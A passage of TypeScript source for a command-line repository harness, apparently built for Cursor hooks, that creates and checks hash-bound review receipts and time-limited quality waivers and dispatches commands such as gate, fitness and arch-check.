function testHarness(options: CliOptions): void {
  const root = targetFrom(options);
  const result = spawnSync(process.execPath, ["--test"], {
    cwd: root,
    stdio: "inherit",
    windowsHide: true,
  });
  if (result.error) throw new Error(`Unable to run Node tests: ${result.error.message}`);
  if (result.status !== 0) process.exitCode = result.status || 1;
}

function canonicalJson(value: unknown): string {
  if (Array.isArray(value)) return `[${value.map(canonicalJson).join(",")}]`;
  if (value && typeof value === "object") {
    const record = value as Record<string, unknown>;
    return `{${Object.keys(record)
      .sort()
      .map((key: string) => `${JSON.stringify(key)}:${canonicalJson(record[key])}`)
      .join(",")}}`;
  }
  return JSON.stringify(value);
}

function contentHash(value: Record<string, unknown>, field: string): string {
  const copy = { ...value };
  delete copy[field];
  return sha256(canonicalJson(copy));
}

function validTimestamp(value: unknown): boolean {
  return (
    typeof value === "string" &&
    /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d{1,9})?(?:Z|[+-]\d{2}:\d{2})$/.test(value) &&
    Number.isFinite(Date.parse(value))
  );
}

interface ReviewReceipt extends DiffBinding {
  version: number;
  scope: string[];
  exclusions: string[];
  reviewer: string;
  decision: string;
  findings: unknown[];
  not_reviewed: string;
  created_at: string;
  content_sha256?: string;
  [key: string]: unknown;
}

function validateReceipt(value: any): string[] {
  const errors: string[] = [];
  const required = [
    "version",
    "base_commit",
    "diff_sha256",
    "scope",
    "exclusions",
    "reviewer",
    "decision",
    "findings",
    "not_reviewed",
    "created_at",
    "content_sha256",
  ];
  for (const field of required) {
    if (!Object.hasOwn(value || {}, field)) errors.push(`Missing receipt field: ${field}.`);
  }
  if (value?.version !== 1) errors.push("Receipt version must be 1.");
  if (typeof value?.base_commit !== "string" || !value.base_commit) {
    errors.push("Receipt base_commit must be a non-empty string.");
  }
  if (!/^[a-f0-9]{64}$/.test(value?.diff_sha256 || "")) {
    errors.push("Receipt diff_sha256 must be a SHA-256 hash.");
  }
  if (
    !Array.isArray(value?.scope) ||
    value.scope.length === 0 ||
    value.scope.some((entry: unknown) => typeof entry !== "string" || !entry)
  ) {
    errors.push("Receipt scope must be a non-empty string array.");
  }
  if (
    !Array.isArray(value?.exclusions) ||
    value.exclusions.some((entry: unknown) => typeof entry !== "string")
  ) {
    errors.push("Receipt exclusions must be a string array.");
  }
  if (typeof value?.reviewer !== "string" || !value.reviewer.trim()) {
    errors.push("Receipt reviewer must be non-empty.");
  }
  if (!["approve", "comment", "request-changes"].includes(value?.decision)) {
    errors.push("Receipt decision is invalid.");
  }
  if (!Array.isArray(value?.findings)) errors.push("Receipt findings must be an array.");
  if (typeof value?.not_reviewed !== "string") errors.push("Receipt not_reviewed must be a string.");
  if (!validTimestamp(value?.created_at)) errors.push("Receipt created_at must be an ISO timestamp.");
  if (!/^[a-f0-9]{64}$/.test(value?.content_sha256 || "")) {
    errors.push("Receipt content_sha256 must be a SHA-256 hash.");
  } else if (contentHash(value, "content_sha256") !== value.content_sha256) {
    errors.push("Receipt content integrity hash is invalid.");
  }
  return errors;
}

function receipt(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const subcommand = positional[0] === "check" ? "check" : "create";
  if (subcommand === "check") {
    const path = resolve(root, String(positional[1] || options.file || ""));
    if (!positional[1] && !options.file) throw new Error("receipt check requires a receipt path.");
    const value = readJson(path);
    const errors = validateReceipt(value);
    let current = null;
    if (errors.length === 0) {
      try {
        const defaultBase = gitBase(root);
        current =
          value.base_commit === "NO_COMMIT" || value.base_commit === "NO_GIT"
            ? binding(root)
            : binding(root, value.base_commit);
        if (value.base_commit !== current.base_commit || value.base_commit !== defaultBase) {
          errors.push("Receipt base commit is stale.");
        }
        if (value.diff_sha256 !== current.diff_sha256) {
          errors.push("Receipt diff hash is stale.");
        }
      } catch (error) {
        errors.push(errorMessage(error));
      }
    }
    const valid = errors.length === 0;
    printJson({ command: "receipt check", path, valid, errors, expected: current, receipt: value });
    if (!valid) process.exitCode = 1;
    return;
  }
  const scope = String(options.scope || ".")
    .split(",")
    .map((value) => value.trim())
    .filter(Boolean);
  const value: ReviewReceipt = {
    version: 1,
    ...binding(root, options.base),
    scope,
    exclusions: String(options.exclusions || "")
      .split(",")
      .map((entry) => entry.trim())
      .filter(Boolean),
    reviewer: String(options.reviewer || "unassigned"),
    decision: String(options.decision || "comment"),
    findings: [],
    not_reviewed: String(options["not-reviewed"] || ""),
    created_at: new Date().toISOString(),
  };
  if (!["approve", "comment", "request-changes"].includes(value.decision)) {
    throw new Error("receipt --decision must be approve, comment, or request-changes.");
  }
  value.content_sha256 = contentHash(value, "content_sha256");
  const errors = validateReceipt(value);
  if (errors.length) throw new Error(errors.join(" "));
  const path = options.out
    ? resolve(root, String(options.out))
    : resolve(root, STATE_REL, "receipts", `${Date.now()}-${value.diff_sha256.slice(0, 12)}.json`);
  if (!boolOption(options, "dry-run")) writeJson(path, value);
  printJson({ command: "receipt create", path, dry_run: boolOption(options, "dry-run"), receipt: value });
}

function waiver(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const subcommand = positional[0] || "list";
  const dir = resolve(root, STATE_REL, "waivers");
  if (subcommand === "list") {
    const waivers = existsSync(dir)
      ? readdirSync(dir)
          .filter((name) => name.endsWith(".json"))
          .map((name) => ({ path: posix(relative(root, resolve(dir, name))), ...readJson(resolve(dir, name)) }))
      : [];
    printJson({ command: "waiver list", waivers });
    return;
  }
  if (subcommand === "check") {
    const path = resolve(root, String(positional[1] || options.file || ""));
    if (!positional[1] && !options.file) throw new Error("waiver check requires a waiver path.");
    const value = readJson(path);
    const errors = validateWaiver(value);
    printJson({ command: "waiver check", path, valid: errors.length === 0, errors, waiver: value });
    if (errors.length) process.exitCode = 1;
    return;
  }
  if (subcommand !== "create") throw new Error("waiver supports create, check, or list.");
  const value = {
    version: 1,
    owner: options.owner,
    reason: options.reason,
    scope: options.scope,
    expiry: options.expiry,
    compensation: options.compensation,
    created_at: new Date().toISOString(),
  };
  const errors = validateWaiver(value);
  if (errors.length) throw new Error(errors.join(" "));
  const id = `${Date.now()}-${sha256(`${value.owner}\0${value.scope}`).slice(0, 10)}`;
  const path = resolve(dir, `${id}.json`);
  if (!boolOption(options, "dry-run")) writeJson(path, value);
  printJson({ command: "waiver create", path, dry_run: boolOption(options, "dry-run"), waiver: value });
}

function validateWaiver(value: any): string[] {
  const errors: string[] = [];
  if (value?.version !== 1) errors.push("Waiver version must be 1.");
  for (const field of ["owner", "reason", "scope", "expiry", "compensation"]) {
    if (!value?.[field] || !String(value[field]).trim()) errors.push(`Missing waiver field: ${field}.`);
  }
  if (!validTimestamp(value?.created_at)) errors.push("Waiver created_at must be an ISO timestamp.");
  const combined = `${value?.reason || ""} ${value?.scope || ""}`.toLowerCase();
  if (/\b(safety|security|secret|credential|destructive|push|deploy|production)\b/.test(combined)) {
    errors.push("Safety and external-side-effect controls cannot be waived.");
  }
  if (value?.expiry) {
    const expiry = Date.parse(value.expiry);
    if (!validTimestamp(value.expiry)) errors.push("Waiver expiry must be an ISO timestamp.");
    else if (expiry <= Date.now()) errors.push("Waiver is expired.");
  }
  return errors;
}

function printJson(value: unknown): void {
  process.stdout.write(`${JSON.stringify(value, null, 2)}\n`);
}

function usage() {
  process.stdout.write(`Cursor repository harness ${VERSION}
Usage: node scripts/harness.mjs <command> [arguments] [--target PATH] [--dry-run]
Commands:
  hook <event>       Evaluate a Cursor hook event from JSON stdin
  doctor             Diagnose prerequisites and harness integrity
  validate           Validate configuration, catalogs, and runtime parity
  test               Run the deterministic Node test suite
  manifest           Print the LF-normalized SHA-256 source manifest
  install            Install safely into a repository
  upgrade            Upgrade managed files without overwriting user changes
  uninstall          Remove only unchanged managed files
  repo-map           Print declared module and dependency boundaries
  affected [paths]   Resolve affected modules from paths and declared dependencies
  verify-plan        Build a verification plan for affected modules
  gate [checks]      Execute the verification plan and record diff-bound receipts
  quality <sub>      status, or attributes for per-attribute evidence coverage
  fitness            Run built-in quality-attribute rules over changed paths or --all
  adapters <sub>     list external quality tools, or add one to the verification matrix
  adr-check          Require every live decision record to name the check that enforces it
  arch-check         Compare real import edges against declared module dependencies
  catalog lint       Prove every tracked path is mapped, global, or ignored with a reason
  context-pack       Build a budgeted context pack on disk and print only its manifest
  task <sub>         start, status, complete, or cancel the owning task
  gate-audit         Report which hooks have actually intervened and which never have
  receipt            Create or check a diff-bound review receipt
  waiver             Create, check, or list non-safety quality waivers
`);
}

export async function main(argv = process.argv.slice(2)) {
  const [command, ...rest] = argv;
  const { options, positional } = parseArgs(rest);
  switch (command) {
    case "hook":
      await hook(positional[0], options);
      break;
    case "doctor":
      doctor(options);
      break;
    case "validate":
      validate(options);
      break;
    case "test":
      testHarness(options);
      break;
    case "manifest":
      manifest(options);
      break;
    case "install":
      installLike("install", options);
      break;
    case "upgrade":
      installLike("upgrade", options);
      break;
    case "uninstall":
      uninstall(options);
      break;
    case "repo-map":
      repoMap(options);
      break;
    case "affected":
      affected(positional, options);
      break;
    case "verify-plan":
      verifyPlan(positional, options);
      break;
    case "gate":
      gate(positional, options);
      break;
    case "quality":
      quality(positional, options);
      break;
    case "arch-check":
      archCheck(options);
      break;
    case "catalog":
      if (positional[0] && positional[0] !== "lint") throw new Error("catalog supports the lint subcommand.");
      catalogLint(options);
      break;
    case "context-pack":
      contextPack(positional, options);
      break;
    case "task":
      taskCommand(positional, options);
      break;
    case "gate-audit":
      gateAudit(options);
      break;
    case "fitness":
      fitness(options);
      break;
    case "adapters":
      adapters(positional, options);
      break;
    case "adr-check":
      adrCheck(options);
      break;
    case "receipt":
      receipt(positional, options);
      break;
    case "waiver":
      waiver(positional, options);
      break;
    case undefined:
    case "help":
    case "--help":
    case "-h":
      usage();
      break;
    default:
      throw new Error(`Unknown command: ${command}`);
  }
}

const invoked = process.argv[1] && resolve(process.argv[1]) === resolve(fileURLToPath(import.meta.url));
if (invoked) {
  main().catch((error) => {
    process.stderr.write(`harness: ${error.message}\n`);
    process.exitCode = 1;
  });
}
